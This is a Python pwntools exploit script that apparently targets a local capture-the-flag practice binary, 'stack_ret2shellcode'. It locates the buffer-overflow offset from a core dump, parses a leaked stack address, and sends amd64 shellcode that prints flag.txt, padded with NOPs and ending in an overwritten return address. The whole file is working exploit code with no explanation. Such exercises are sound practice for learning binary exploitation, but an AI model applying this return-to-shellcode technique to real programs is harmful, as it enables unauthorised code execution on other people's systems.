from pwn import *

pp = process('../src/stack_ret2shellcode', cwd="../src")
pp.sendline(cyclic(200))
pp.interactive()
try:
    pp.close()
except BrokenPipeError:
    print("Broken pipe.")

c = Corefile("../src/core")
print(c.fault_addr)

p = process('../src/stack_ret2shellcode', cwd="../src")
addr = int(b"0x" + p.recvuntil(">").split(b"0x")[1].split(b" >")[0].strip(), 16)

shellcode = b""
shellcode += asm(shellcraft.amd64.linux.cat("flag.txt"), arch="amd64")
shellcode += b"\x90" * (cyclic_find(p64(c.fault_addr)) - len(shellcode))
shellcode += p64(addr)
p.sendline(shellcode)
p.interactive()
try:
    p.close()
except BrokenPipeError:
    print("Broken pipe.")
